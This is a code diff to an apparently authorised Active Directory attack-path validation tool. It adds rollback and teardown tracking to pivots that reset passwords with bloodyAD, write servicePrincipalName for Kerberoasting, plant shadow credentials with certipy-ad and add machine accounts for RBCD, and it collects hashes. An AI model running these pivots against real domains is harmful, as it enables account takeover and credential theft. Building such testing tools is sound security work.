@@ -376,6 +376,17 @@ class GenericAllExecutor(ValidationExecutor):
                                         mutation, record))
         return artifact
 
+    def teardown(self, ctx, obligation) -> dict:
+        pivot = obligation["pivot"]
+        if pivot not in {"spn_kerberoast", "rbcd"}:
+            return super().teardown(ctx, obligation)
+        mutation = {"applied": True,
+                    "rollback": {"performed": False, "method": None, "verified": False}}
+        rollback = self._rollback_spn if pivot == "spn_kerberoast" else self._rollback_rbcd
+        rollback(ctx, ctx.config, *obligation["args"], mutation, [], [],
+                 lambda *args, **kwargs: None)
+        return mutation["rollback"]
+
     # ---------------------------------------------------------------- pivot: reset_password
     def _run_reset_password(self, ctx, cfg, target, v, dc, out_dir, steps, errors,
                             gate, mutation, record) -> dict:
@@ -394,6 +405,7 @@ class GenericAllExecutor(ValidationExecutor):
         errors.append(f"advisory:irreversible:original_password_not_recoverable:"
                       f"{target}@{cfg.domain}")
         set_argv = _bloodyad_auth_argv(cfg, dc) + ["set", "password", target, new_pw]
+        ctx._pending_teardown = {"pivot": "reset_password", "target": target}
         res = ctx.runner.run(set_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
         set_out = (res.stdout or "") + (res.stderr or "")
         set_ok = bool(_RE_BLOODYAD_SET_PW_OK.search(set_out))
@@ -446,6 +458,7 @@ class GenericAllExecutor(ValidationExecutor):
 
         set_argv = _bloodyad_auth_argv(cfg, dc) + ["set", "object", target,
                                                    "servicePrincipalName", "-v", spn]
+        ctx._pending_teardown = {"pivot": "spn_kerberoast", "args": (target, spn)}
         res = ctx.runner.run(set_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
         set_out = (res.stdout or "") + (res.stderr or "")
         set_ok = bool(_RE_BLOODYAD_SET_OK.search(set_out))
@@ -566,6 +579,7 @@ class GenericAllExecutor(ValidationExecutor):
 
         shadow_argv = ["certipy-ad", "shadow", "auto", "-account", target,
                        *self._certipy_auth_argv(cfg), "-dc-ip", dc]
+        ctx._pending_teardown = {"pivot": "shadow_creds", "target": target}
         res = ctx.runner.run(shadow_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
         out = (res.stdout or "") + (res.stderr or "")
         ctx._pending_reveal_artifact["_reveal"].extend(pkinit_hashes(self.technique, target, out))
@@ -631,6 +645,7 @@ class GenericAllExecutor(ValidationExecutor):
             return self._artifact(steps, gate, mutation, None, False, errors)
         add_argv = ["impacket-addcomputer", "-computer-name", f"{new}$",
                     "-computer-pass", new_pass, "-dc-ip", dc, *op_extra, op_target]
+        ctx._pending_teardown = {"pivot": "rbcd", "args": (vsam, new, op_target, op_extra)}
         res = ctx.runner.run(add_argv, timeout=cfg.tool_timeout_s)
         add_ok = bool(_RE_GA_ADDCOMPUTER_OK.search(res.stdout or ""))
         record("addcomputer", add_argv, res, add_ok)
